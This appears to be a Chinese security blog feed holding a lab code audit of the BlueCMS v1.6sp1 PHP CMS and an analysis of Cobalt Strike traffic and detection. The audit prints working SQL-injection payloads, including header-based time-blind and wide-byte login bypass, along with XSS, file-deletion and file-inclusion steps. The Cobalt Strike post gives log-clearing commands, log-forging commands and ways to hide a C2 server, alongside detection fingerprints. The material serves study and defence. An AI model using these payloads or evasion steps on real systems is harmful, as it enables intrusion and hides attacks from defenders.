<br>    <span class="hljs-keyword">if</span> lookErr != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(lookErr)  <br>    &#125;  <br>  <br>    args := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, <span class="hljs-string">&quot;-l&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>&#125;  <br>  <br>    env := os.Environ()  <br>  <br>    execErr := syscall.Exec(binary, args, env)  <br>    <span class="hljs-keyword">if</span> execErr != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(execErr)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>spawning external processes：需要一个外部进程来运行 go<br>exec process：需要另一个进程来替换当前的 go 进程</p><h2 id="Exit"><a href="#Exit" class="headerlink" title="Exit"></a>Exit</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;!&quot;</span>)<br><br>    os.Exit(<span class="hljs-number">3</span>)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bluecms_v1.6sp1</title>
    <link href="/2024/07/23/bluecms_v1.6sp1/"/>
    <url>/2024/07/23/bluecms_v1.6sp1/</url>
    
    <content type="html"><![CDATA[<h1 id="bluecms-v1-6sp1"><a href="#bluecms-v1-6sp1" class="headerlink" title="bluecms_v1.6sp1"></a>bluecms_v1.6sp1</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>win11</p><p>MYSQL 5.6.26</p><p>PHP 5.4.45</p><p>Apche 2.4.39</p><p>VScode 1.81.1</p><p>在vscode中修改php版本：</p><p>设置-&gt;PHP-&gt;settings.json:</p><p><img src="/2023/04/27/file-upload/e-20230829160600464.png" alt="image-20230829160600464"></p><p>将对应的php.exe文件填入如下路径中：</p><p><img src="/2023/04/27/file-upload/e-20230829160732751.png" alt="image-20230829160732751"></p><p>中文显示乱码问题，安装插件即可：</p><p><img src="/2023/04/27/file-upload/e-20230829160842809.png" alt="image-20230829160842809"></p><h3 id="安装cms"><a href="#安装cms" class="headerlink" title="安装cms"></a>安装cms</h3><p>bluecms v1.6sp  <a href="https://zdown.chinaz.com/CMS%E5%BB%BA%E7%AB%99/bluecms.rar">https://zdown.chinaz.com/CMS%E5%BB%BA%E7%AB%99/bluecms.rar</a></p><p>在phpstudy中WWW目录下解压，访问localhost&#x2F;uploads目录根据提示安装即可。</p><h2 id="常见审计思路"><a href="#常见审计思路" class="headerlink" title="常见审计思路"></a>常见审计思路</h2><p>常见的审计思路有三个：</p><ul><li>寻找可控变量</li><li>工具自动化审计</li><li>搜索敏感函数</li></ul><h3 id="寻找可控变量"><a href="#寻找可控变量" class="headerlink" title="寻找可控变量"></a>寻找可控变量</h3><p>该方法主要寻找用户可控的输入点，再跟踪变量，查看是否有sql或者其他利用方式。</p><p>例如在ad_js.php中：</p><p><img src="/2023/04/27/file-upload/e-20230829164108868.png" alt="image-20230829164108868"></p><p>$ad_id即为可控变量，通过GET方法传入，并且查找引用发现后续回进行sql语句的拼接，这里可以考虑sql注入漏洞。</p><h3 id="自动化审计-人工review"><a href="#自动化审计-人工review" class="headerlink" title="自动化审计+人工review"></a>自动化审计+人工review</h3><p>通过工具进行自动化审计也是一种方法，但是误报率较高，需要人工进行验证。</p><p>以seay为例：</p><p><img src="/2023/04/27/file-upload/e-20230829164307243.png" alt="image-20230829164307243"></p><p>点击新建项目，自动审计，即可开始自动化审计，通过敏感函数等等判断出可能存在漏洞的点，后续对漏洞进行人工验证即可。缺点是误报较高，并且对于逻辑漏洞无法发现。</p><h3 id="搜索敏感函数"><a href="#搜索敏感函数" class="headerlink" title="搜索敏感函数"></a>搜索敏感函数</h3><p>对于常见的危险函数进行追踪，查看是否能够进行利用。</p><table><thead><tr><th>命令执行</th><th>system、shell_exec、passthru、popen、proc_open</th></tr></thead><tbody><tr><td>文件包含</td><td>require、include、require_once、include_once</td></tr><tr><td>变量覆盖</td><td>parse_str 、mb_parse_str</td></tr><tr><td>代码执行</td><td>eval、assert、preg_replace</td></tr><tr><td>文件操作</td><td>file_get_contents 、file_put_contents 、move_uploaded_file 、unlink &amp; delete</td></tr></tbody></table><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p><img src="/2023/04/27/file-upload/e-20230829164712114.png" alt="image-20230829164712114"></p><p>整个cms的结构如图所示，index.php为默认的网站首页，include应该是用来包含的一些全局文件，install是安装cms的相关内容，admin为管理员访问的目录。</p><p>查看index.php:</p><p><img src="/2023/04/27/file-upload/e-20230829164922463.png" alt="image-20230829164922463"></p><p>首先包含了两个文件: include&#x2F;common.inc.php，include&#x2F;index.fun.php。</p><p>查看common.inc.php文件：</p><p><img src="/2023/04/27/file-upload/e-20230829165215854.png" alt="image-20230829165215854"></p><p>对输入的内容都进行了转义，后续如果包含了该文件，需要考虑是否会有影响。</p><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>查看ad_js.php文件，前文提到用户可控参数$ad_id，如果该参数不为空，就会拼接导sql语句中，需要注意这里包含了&#x2F;include&#x2F;common.inc.php文件，但是$ad_id在拼接时并没有加上引号：</p><p><img src="/2023/04/27/file-upload/e-20230829165519893.png" alt="image-20230829165519893"></p><p>将sql语句echo出来，拼接后访问：</p><p><img src="/2023/04/27/file-upload/e-20230829165709647.png" alt="image-20230829165709647"></p><p>order by判断个数：</p><p><img src="/2023/04/27/file-upload/e-20230829165745316.png" alt="image-20230829165745316"></p><p>ad_id&#x3D;8时候报错，说明有字段数为7，判断回显在第七位：</p><p><img src="/2023/04/27/file-upload/e-20230829170055751.png" alt="image-20230829170055751"></p><p>输出数据库名：</p><p><img src="/2023/04/27/file-upload/e-20230829170122008.png" alt="image-20230829170122008"></p><p>完成。</p><h3 id="insert-into注入"><a href="#insert-into注入" class="headerlink" title="insert into注入"></a>insert into注入</h3><p>在seay中发现如下内容：</p><p><img src="/2023/04/27/file-upload/e-20230829170345482.png" alt="image-20230829170345482"></p><p>ip地址可以伪造，可能引发sql注入漏洞，跟进查看。</p><p>双击跟入，发现ip是通过getip()函数获得：</p><p><img src="/2023/04/27/file-upload/e-20230829170449338.png" alt="image-20230829170449338"></p><p>在vscode中ctrl+shift+f，全局搜索getip()函数，发现存在拼接sql语句：</p><p><img src="/2023/04/27/file-upload/e-20230829170943476.png" alt="image-20230829170943476"></p><p>在comment.php中，查看该文件内容:</p><p>该sql语句在一个if条件中：</p><p><img src="/2023/04/27/file-upload/e-20230829171143179.png" alt="image-20230829171143179"></p><p>如果$act变量为send，才会走到拼接这一步，继续看$act变量，在comment.php开头定义：</p><p><img src="/2023/04/27/file-upload/e-20230829171524497.png" alt="image-20230829171524497"></p><p>结合前面的代码，通过POST添加参数comment,type,id,getip()通过添加请求头X-Forwarded-For来获取：</p><p><img src="/2023/04/27/file-upload/e-20230829172358868.png" alt="image-20230829172358868"></p><p>echo一下sql语句，可以看到X-Forwarded-For的值被插入到了sql语句中并且完成可控，直接插入payload，可以延时注入：</p><p><code>X-Forwarded-For: 1&#39;+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),&#39;1&#39;)#</code></p><p><img src="/2023/04/27/file-upload/e-20230829172609131.png" alt="image-20230829172609131"></p><p>注入成功，也可以发布一篇文章，通过<code>X-Forwarded-For: 1&#39;,&#39;1&#39; ),(&quot;&quot;,&#39;2&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(database()),&#39;1&#39;,&#39;1</code>注入，直接在评论区获得敏感信息。</p><p>同样，getip()的值被赋给了online_ip:</p><p><img src="/2023/04/27/file-upload/e-20230829173205733.png" alt="image-20230829173205733"></p><p>跟一下online_ip的引用，同样是insert into语句，ip可控，利用同样的payload即可注入成功：</p><p><img src="/2023/04/27/file-upload/e-20230829173135221.png" alt="image-20230829173135221"></p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>来到登录界面，就是admin&#x2F;login.php:</p><p><img src="/2023/04/27/file-upload/e-20230829232044954.png" alt="image-20230829232044954"></p><p>这里看到两个点：</p><ul><li>包含了&#x2F;include&#x2F;common.inc.php文件</li><li>通过check_admin进行校验</li></ul><p>首先看一下&#x2F;include&#x2F;common.inc.php文件。前面提到，该文件中对于输入都利用函数deep_addslashes进行了过滤：</p><p><img src="/2023/04/27/file-upload/e-20230829233428137.png" alt="image-20230829233428137"></p><p>同时，看到这里包含了另一个文件include&#x2F;mysql.class.php，查看：</p><p><img src="/2023/04/27/file-upload/e-20230829233548258.png" alt="image-20230829233548258"></p><p>在实例化mysql对象时，将字符编码设置为了gbk，为宽字节注入创造了条件。</p><p>再看check_admin方法，跳到common.fun.php中：</p><p><img src="/2023/04/27/file-upload/e-20230829233722154.png" alt="image-20230829233722154"></p><p>首先获取到$db，进行mysql的实例化，这里进行连接时，编码为gbk，加上deep_addslashes，可以造成宽字节注入。</p><p>这里的可控参数为name，跟到login.php中：</p><p><img src="/2023/04/27/file-upload/e-20230829234102222.png" alt="image-20230829234102222"></p><p>name即为post方法得到的admin_name的值。</p><p>接下来构造payload，访问&#x2F;admin&#x2F;login.php：</p><p><img src="/2023/04/27/file-upload/e-20230829234235210.png" alt="image-20230829234235210"></p><p>进行后台管理员登录界面，act&#x3D;do_login与代码中也是一致的，接下来将admin改为<code>admin_name=admin%df&#39;%20or%201=1#</code>，’被转义，变成%5c，%df%5c结合，成功闭合：</p><p><img src="/2023/04/27/file-upload/e-20230829234649056.png" alt="image-20230829234649056"></p><p><img src="/2023/04/27/file-upload/e-20230829234659989.png" alt="image-20230829234659989"></p><p>登录进入后台。</p><h3 id="任意url跳转"><a href="#任意url跳转" class="headerlink" title="任意url跳转"></a>任意url跳转</h3><p>回到user.php中，存在两个可控参数：</p><p><img src="/2023/04/27/file-upload/e-20230830085553883.png" alt="image-20230830085553883"></p><p>act用于后续的if-else判断，重点关注from。往下走：</p><p><img src="/2023/04/27/file-upload/e-20230830085720948.png" alt="image-20230830085720948"></p><p>如果act为do_login，from就变成base64解码的值，继续往下，看到showmsg：</p><p><img src="/2023/04/27/file-upload/e-20230830085812161.png" alt="image-20230830085812161"></p><p>from的值即为跳转的url：</p><p><img src="/2023/04/27/file-upload/e-20230830090106200.png" alt="image-20230830090106200"></p><p>将<a href="http://www.baidu.com进行base64编码aHR0cDovL3d3dy5iYWlkdS5jb20=，修改from的值：">http://www.baidu.com进行base64编码aHR0cDovL3d3dy5iYWlkdS5jb20=，修改from的值：</a></p><p><img src="/2023/04/27/file-upload/e-20230830092412905.png" alt="image-20230830092412905"></p><p>成功跳转至百度页面：</p><p><img src="/2023/04/27/file-upload/e-20230830092345591.png" alt="image-20230830092345591"></p><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>接上前面的showmsg函数，在admin&#x2F;card.php中，有如下代码：</p><p><img src="/2023/04/27/file-upload/e-20230830100947220.png" alt="image-20230830100947220"></p><p>加上name可控，直接xss：</p><p><img src="/2023/04/27/file-upload/e-20230830101042255.png" alt="image-20230830101042255"></p><h3 id="存储xss"><a href="#存储xss" class="headerlink" title="存储xss"></a>存储xss</h3><p>同样是在user.php中，存在如下注册功能：</p><p><img src="/2023/04/27/file-upload/e-20230830102700172.png" alt="image-20230830102700172"></p><p>没有进行过滤操作，仅仅进行了trim之后就插入了数据库，可以在email处进行存储型xss。</p><p>前端存在格式校验，在burp中修改：</p><p><img src="/2023/04/27/file-upload/e-20230830102603610.png" alt="image-20230830102603610"></p><p><img src="/2023/04/27/file-upload/e-20230830102621935.png" alt="image-20230830102621935"></p><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>还是在user.php中，存在unlink函数：</p><p><img src="/2023/04/27/file-upload/e-20230830103358322.png" alt="image-20230830103358322"></p><p>直接根据post传入的face_pic3的值删除文件，接下来以robots.txt为例。</p><p>首先访问，存在：</p><p><img src="/2023/04/27/file-upload/e-20230830103215886.png" alt="image-20230830103215886"></p><p>构造数据包：</p><p><img src="/2023/04/27/file-upload/e-20230830103443660.png" alt="image-20230830103443660"></p><p>发包后，robots.txt文件被删除，存在任意文件删除漏洞。</p><p><img src="/2023/04/27/file-upload/e-20230830103228785.png" alt="image-20230830103228785"></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>还是在user.php中，往上看发现存在include，并且参数可控：</p><p><img src="/2023/04/27/file-upload/e-20230830103811889.png" alt="image-20230830103811889"></p><p>但是这里后面拼接了&#x2F;index.php，需要进行截断，目前php版本为5.4.45，需要切换到低版本才行。故不进行演示，直接在post请求体加上参数<code>pay=../../robots.txtcode></p>]]></content>
    
    
    <categories>
      
      <category>vulnerability</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cobalt strike流量分析</title>
    <link href="/2024/07/23/cobalt%20strike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/23/cobalt%20strike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="CS（检测与隐藏）"><a href="#CS（检测与隐藏）" class="headerlink" title="CS（检测与隐藏）"></a>CS（检测与隐藏）</h1><p><img src="/2023/04/27/file-upload/40723154614207.png" alt="image-20240723154614207"></p><h2 id="Process-Execution-——日志溯源"><a href="#Process-Execution-——日志溯源" class="headerlink" title="Process Execution ——日志溯源"></a>Process Execution ——日志溯源</h2><p>一般windows失陷后，排查方法有查看隐藏用户，查看端口开放情况，外联情况，防火墙策略，windows日志等等，其中最主要的就是通过windows日志推理出大致的失陷过程，此处结合sysmon工具来查找CS利用的有关信息。</p><h3 id="sysmon工具介绍"><a href="#sysmon工具介绍" class="headerlink" title="sysmon工具介绍"></a>sysmon工具介绍</h3><p>系统监视器 [Sysmon][<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon]">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon]</a> 是一种 Windows 系统服务和设备驱动程序，一旦安装在系统上，它就会在系统重新启动后保持驻留，以监视系统活动并将其记录到 Windows 事件日志中。它提供有关进程创建、网络连接和文件创建时间更改的详细信息，并且用完整的命令行记录下子进程和父进程的创建行为。</p><p><img src="/2023/04/27/file-upload/g" alt="image-20220331142950513"></p><p>下载后通过<code>sysmon.exe -accepteula -i</code>进行安装，表示接受Eula，更多情况下会使用自定义的配置文件，推荐<a href="https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml">sysmonconfig-export.xml</a>，已经预定义了高质量的事件跟踪模板。</p><p><code>sysmon64.exe -accepteula -i sysmonconfig-export.xml</code></p><p><img src="/2023/04/27/file-upload/fig.jpg" alt="image-20220331143237855"></p><p>查看sysmon路径：打开eventvwr.msc，Applications and Services Logs&#x2F;Microsoft&#x2F;Windows&#x2F;Sysmon&#x2F;Operational</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220331165302171"></p><p>可以看到commandline,currentdirectory,parentimage等敏感信息。</p><p>再介绍一个sysmon tool,[sysmon view][<a href="https://github.com/nshalabi/SysmonTools]">https://github.com/nshalabi/SysmonTools]</a></p><p>exe直接打开，通过命令<code>WEVTUtil query-events &quot;Microsoft-Windows-Sysmon/Operational&quot; /format:xml /e:sysmonview &gt; eventlog.xml</code>导出log文件，sysmon view加载，即可实现更好的可视化效果。</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220331170008115"></p><h3 id="CS-行为分析"><a href="#CS-行为分析" class="headerlink" title="CS 行为分析"></a>CS 行为分析</h3><p>新建监听器，端口为80，生成一个reverse_http的后门，在win10主机中运行，并通过shell，powershell，hashdump等命令进行测试。</p><p>接下来通过sysmon查看日志：</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220401145701128"></p><p>可以看到，sysmon标注了set注册表值，创建进程，网络连接，创建管道等等任务。</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220401150205440"></p><p>查看详细信息，可以看到commandline,currentdirectory,parentimage等信息。</p><p>通过sysmon view查看，可以发现其间有artifact.exe,cmd.exe,ipconfig.exe等等运行，并且给出了image path以及GUID。</p><p><img src="/2023/04/27/file-upload/" alt="image-20220401171617902"></p><p>首先查看后门文件artifact.exe：</p><p><img src="/2023/04/27/file-upload/jpg" alt="image-20220401172113629"></p><p>可以看到首先创建了进程，接着有创建通信管道，连接管道，联网，创建远程线程等等操作：</p><p><img src="/2023/04/27/file-upload/.jpg" alt="image-20220401172427459"></p><p>从日志分析可以看出，连接的远程ip为192.168.111.160:80，从CreateRemoteThread事件也能大致判断出，后门文件在试图进程注入到rundll32.exe中。</p><p>接下来通过powershell.exe和cmd.exe来验证CS的shell和powershell命令。以cmd.exe为例：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220401173554196"></p><p>cmd.exe一共对应了3个session，分别为artifact.exe和rundll32.exe的进程创建。而期间没有手动运行过cmd，结合前面artifact的进程注入， 这三个process应该都是执行shell命令时所创建。</p><p>查看rundll32.exe,可以看到都是由父进程artifact发起，并且rundll32本身也在尝试进一步注入到lsass.exe。</p><p><img src="/2023/04/27/file-upload/g" alt="image-20220401174003369"></p><p>CS中执行的命令为shell whoami，最后查看whoami.exe:</p><p><img src="/2023/04/27/file-upload/g" alt="image-20220401174218212"></p><p>whoami.exe由cmd.exe拉起，执行的命令为cmd.exe &#x2F;C whoami,进而创建了进程4392，运行了whoami.exe。结合前面的分析，artifact.exe在运行之后，创建了进程和管道，并进行管道连接，进程注入等，接着开始DNS查询并且上线了目标主机，当CS客户端执行命令时(shell举例)，后门文件直接拉起cmd.exe，并通过cmd执行命令。</p><h3 id="清除与混淆"><a href="#清除与混淆" class="headerlink" title="清除与混淆"></a>清除与混淆</h3><p><strong>手动清除日志</strong></p><p><strong>命令行清除Windows事件日志</strong></p><ul><li><p>PowerShell -Command “&amp; {Clear-Eventlog -Log Application,System,Security}”</p></li><li><p>Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname}</p></li></ul><p><strong>第三方脚本</strong></p><p>[Invoke-Phant0m][<a href="https://github.com/hlldz/Invoke-Phant0m]">https://github.com/hlldz/Invoke-Phant0m]</a></p><p>通过遍历事件日志服务进程（专用svchost.exe）的线程堆栈，并标识事件日志线程以结束事件日志服务线程。借此阻止系统进行正常的日志收集。</p><p><strong>Windows日志伪造</strong></p><ul><li>eventcreate -l system -so administrator -t warning -d “fake log” -id 500</li></ul><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a><strong>默认端口</strong></h2><p>cobalt strike默认端口为50050：</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220402143719173"></p><p>Team server is up on 50050。</p><p>端口特征可以通过编辑teamserver进行修改：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220402143314260"></p><p>-Dcobaltstrike.server_port&#x3D;50050,在此将端口改为自定义值：</p><p><img src="/2023/04/27/file-upload/jpg" alt="image-20220402143933136"></p><p>端口特征已经消失。</p><h2 id="证书特征"><a href="#证书特征" class="headerlink" title="证书特征"></a><strong>证书特征</strong></h2><p>Keytool 是一个Java数据证书的管理工具 ,Keytool 将密钥(key)和证书(certificates)存在一个称为keystore的文件中。在keystore里，包含<br>密钥实体(Key entity)和可信任的证书实体(trusted certificate entries)。</p><p>查看CS目录下的文件，使用keytool查看证书：</p><CS src="CS/dir.jpg" alt="image-20220324140030951" style="zoom:50%;" /><p>命令如下：</p><p><code>keytool -list -v -keystore cobaltstrike.store</code></p><p>密码初始为123456</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220324134547989"></p><p>可以发现有很明显的证书特征，在另一台kali上查看，发现同样如此：</p><p><img src="/2023/04/27/file-upload/jpg" alt="image-20220324134803598"></p><h3 id="nmap发现"><a href="#nmap发现" class="headerlink" title="nmap发现"></a>nmap发现</h3><p>首先，使用nmap -A 扫描160主机（默认证书），可以从commanName,organizationName等明显看出为CS的服务器，结果如下：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220324135044513"></p><p>扫描时发现，160主机会有如下报错，但是不影响使用：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220324135318187"></p><p>使用keytool命令修改161主机的默认keystore，<code>keytool -keystore cobaltstrike_new.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN=US, OU=360.com, O=Software, L=Somewhere, ST=Cyberspace, C=CN&quot;</code></p><p>此外还可以通过向[Let’s Encrypt][<a href="https://letsencrypt.org/]%E7%94%B3%E8%AF%B7%E4%B8%80%E4%B8%AA%E5%85%8D%E8%B4%B9%E8%AF%81%E4%B9%A6%E5%B9%B6%E6%89%93%E5%8C%85%E4%B8%BAkeystore%EF%BC%8C%E7%94%A8%E6%9D%A5%E6%9B%BF%E6%8D%A2CS%E8%87%AA%E5%B8%A6%E7%9A%84https%E8%AF%81%E4%B9%A6%E3%80%82">https://letsencrypt.org/]申请一个免费证书并打包为keystore，用来替换CS自带的https证书。</a></p><p>修改之后对161主机进行nmap -A扫描，发现ssl-cert扫描出的commonName等内容已经变成了手动生成的内容，不再有Cobalt Strike特征。</p><p><img src="/2023/04/27/file-upload/" alt="image-20220324141858497"></p><h3 id="测绘引擎发现"><a href="#测绘引擎发现" class="headerlink" title="测绘引擎发现"></a>测绘引擎发现</h3><p>根据上面的信息，通过fofa引擎进行搜索：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">port</span>=<span class="hljs-string">&quot;50050&quot;</span> &amp;&amp; cert=<span class="hljs-string">&quot;cobaltstrike&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/" alt="image-20220402135324371"></p><p>可以发现2000+CS服务器存活。通过censys同样能找到很多CS证书的主机(默认keystore的指纹SHA256)：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">7B49FC589E7E738E3457859D269996ECEF83F693570B0AC482C426B1FA04BD73<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/g" alt="image-20220402140226767"></p><h2 id="伪造上线"><a href="#伪造上线" class="headerlink" title="伪造上线"></a>伪造上线</h2><p>首先简单介绍cobalt strike最常用的两种后门：</p><p>Windows Executable &amp; Windows Executable(S)</p><p><img src="/2023/04/27/file-upload/" alt="image-20220410155803086"></p><p>其中第一种是阶段传输，上线之后从特定url下载得到完整的后门文件，而第二种是不分段传输，直接上传完整payload，两种后门文件的大小如下：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220410160047252"></p><p>CS的上线流程大概如下图所示：</p><p><img src="/2023/04/27/file-upload/" alt="ch"></p><p>其中Stager向Beacon Staging Server请求下载体积较大更复杂的Stage到本地，Beacon Staging Server会校验Url的合法性，Stage解密并解析Beacon配置信息（比如公钥PublicKey、C2 Server信息，接着Stage通过公钥PublicKey加密主机的元数据并发送至C2 Server，C2 Server用私钥解密数据获取主机元数据。</p><h3 id="Checksum8"><a href="#Checksum8" class="headerlink" title="Checksum8"></a>Checksum8</h3><p>360团队先前公布了关于CS中URL校验的算法，也就是checksum8，大概内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_checksum</span>(<span class="hljs-params"><span class="hljs-built_in">input</span></span>):<br>    trial = <span class="hljs-string">&quot;&quot;</span><br>    total = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> total != <span class="hljs-built_in">input</span>:<br>        total = <span class="hljs-number">0</span><br>        trial=<span class="hljs-string">&#x27; &#x27;</span>.join(random.choice(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzQWERTYUIOPLKJHGFDSAZXCVBNM1234567890&quot;</span>)  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>))<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            total = (total + <span class="hljs-built_in">ord</span>(trial[i:i+<span class="hljs-number">1</span>])) % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">return</span> trial<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    uri_x86 = generate_checksum(<span class="hljs-number">92</span>)<br>    uri_x64 = generate_checksum(<span class="hljs-number">93</span>)<br>    <span class="hljs-built_in">print</span> uri_x86<br>    <span class="hljs-built_in">print</span> uri_x64<br></code></pre></td></tr></table></figure><p>运行脚本，并运行Server端，通过请求<code>server_ip/url_x86/x64</code>，可以得到图中所示的文件，也就是完整的payload，具体内容如下：</p><p><img src="/2023/04/27/file-upload/g" alt="image-20220410215346701"></p><p>在报文中体现为：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220410220103034"></p><p><strong>因此，此处可能可以通过对简单的4位url进行处理，进而判断是否是在通过server下载完整后门文件</strong></p><h4 id="隐藏方法"><a href="#隐藏方法" class="headerlink" title="隐藏方法"></a>隐藏方法</h4><p>修改WebServer.class中的此次函数校验的值，修改92，93为其他值，该默认脚本就无法识别。</p><p><strong>检测方法：</strong></p><p>因为只修改校验值，而算法限制校验值有大小限制，因此最多枚举256次就枚举出来。</p><h3 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h3><ul><li><p>[cobaltstrikescan][<a href="https://github.com/jpcertcc/aa-tools/blob/master/cobaltstrikescan.py]">https://github.com/jpcertcc/aa-tools/blob/master/cobaltstrikescan.py]</a></p></li><li><p>[CobaltStrikeParser][<a href="https://github.com/Sentinel-One/CobaltStrikeParser]">https://github.com/Sentinel-One/CobaltStrikeParser]</a></p></li></ul><p>结合URL合法性校验的算法和Stage的解密算法，接下来简单介绍如何通过这两者结合来伪造主机上线：</p><ul><li>通过[cobaltspam][<a href="https://github.com/hariomenkel/CobaltSpam]%E7%94%9F%E6%88%90%E4%BC%AA%E9%80%A0%E4%B8%BB%E6%9C%BA,%E4%BD%86CobaltSpam%E4%B8%8A%E7%BA%BF%E7%9A%84%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E9%83%BD%E6%98%AF%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%EF%BC%8C%E5%BE%88%E5%AE%B9%E6%98%93%E8%A2%AB%E8%AF%86%E5%88%AB%E3%80%82">https://github.com/hariomenkel/CobaltSpam]生成伪造主机,但CobaltSpam上线的主机信息都是随机生成，很容易被识别。</a></li><li>手动生成</li></ul><p>首先，构造Stager Url下载Stage，然后，解析Stager Beacon的配置文件，此处推荐[cobaltstrikescan][<a href="https://github.com/jpcertcc/aa-tools/blob/master/cobaltstrikescan.py]%E5%92%8C[CobaltStrikeParser][https://github.com/Sentinel-One/CobaltStrikeParser]%EF%BC%8C%E5%BE%97%E5%88%B0%E4%BA%86PublicKey%E5%85%AC%E9%92%A5%E4%B8%8EC2">https://github.com/jpcertcc/aa-tools/blob/master/cobaltstrikescan.py]和[CobaltStrikeParser][https://github.com/Sentinel-One/CobaltStrikeParser]，得到了PublicKey公钥与C2</a> Server地址之后，构造虚假主机元数据，加密发送至C2 Server。</p><p><img src="/2023/04/27/file-upload/" alt="spam"></p><h2 id="HTTP流量特征"><a href="#HTTP流量特征" class="headerlink" title="HTTP流量特征"></a>HTTP流量特征</h2><p>对于CS通信过程中的HTTP流量特征，主要有如下两点：</p><ul><li>URL校验的checksum8算法</li></ul><p>URL校验部分可以通过对4位url进行简单处理验证，判断是否在与server进行通信</p><ul><li>submit请求</li></ul><p><img src="/2023/04/27/file-upload/g" alt="submit"></p><p>通过多次报文对比，都会存在&#x2F;submit.php?id&#x3D;xxx的url，且每个主机都对应一个独有的id值。该id值与cookie解密之后的id是一致的。</p><h3 id="隐藏方法-1"><a href="#隐藏方法-1" class="headerlink" title="隐藏方法"></a>隐藏方法</h3><ul><li>修改函数校验值</li><li>通过<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a>，修改默认请求配置，改成高可信厂商</li></ul><h2 id="HTTPS流量特征"><a href="#HTTPS流量特征" class="headerlink" 